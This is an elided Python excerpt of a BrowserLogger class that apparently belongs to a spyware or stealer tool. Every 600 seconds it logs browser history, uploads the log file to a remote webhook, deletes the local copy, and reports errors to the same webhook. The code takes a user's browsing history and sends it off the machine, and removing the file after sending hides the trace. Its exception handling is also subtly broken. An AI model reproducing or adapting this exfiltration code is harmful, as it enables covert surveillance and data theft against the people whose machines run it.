...
class BrowserLogger:
    def __init__(self, software_dir_name, webhook_url):
        ...
        self.log_file = os.path.join(
            get_logs_path(self.software_dir_name), "browser_log.txt"
        )
        self.interval = 600
    ...
    def log_browser(self):
        ...
        try:
            ...
            send_webhook(
                self.webhook_url, file={"browser_logs.txt": open(self.log_file, "rb")}
            )
            os.remove(self.log_file)
        except Exception or UnboundLocalError as e:
            send_webhook(
                self.webhook_url, f"```❌ Error logging browser history: {e}```"
            )
